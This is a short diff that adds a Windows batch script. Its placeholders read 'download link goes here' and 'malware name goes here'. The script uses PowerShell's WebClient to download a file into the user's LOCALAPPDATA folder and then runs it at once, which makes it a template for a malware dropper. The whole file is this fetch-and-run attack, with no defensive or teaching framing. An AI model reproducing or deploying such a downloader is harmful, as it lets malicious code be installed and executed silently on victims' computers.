@@ -1,0 +1,14 @@
+@echo off
+setlocal
+
+REM Set the URL of the file to download
+set "url=download link goes here"
+
+REM Set the destination folder to your LOCALAPPDATA folder
+set "dest=%LOCALAPPDATA%\malware name goes here "
+
+REM Use PowerShell to download the file to the destination folder
+powershell -Command "try { (New-Object Net.WebClient).DownloadFile('%url%', '%dest%') } catch { Write-Error $_ }"
+
+REM Execute the downloaded file
+start "" "%dest%"
